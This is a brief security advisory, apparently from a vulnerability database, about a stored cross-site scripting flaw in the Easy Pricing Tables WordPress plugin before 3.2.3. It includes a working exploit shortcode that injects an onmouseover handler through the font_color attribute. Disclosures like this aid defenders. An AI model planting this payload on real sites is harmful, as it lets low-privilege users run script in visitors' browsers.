# Pricing Tables WordPress Plugin – Easy Pricing Tables < 3.2.3 - Contributor+ Stored XSS via Shortcode

The plugin does not validate and escape one of its shortcode attributes, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attack.

Exploit shortcode:
[easy-pricing-toggle font\_color='red; border:5px solid red;" onmouseover="alert(1)"' background\_color='red' border\_color='red' default\_title='xss' alternate\_title='xss' default\_pricing\_table\_id='1' alternate\_pricing\_table\_id='2']
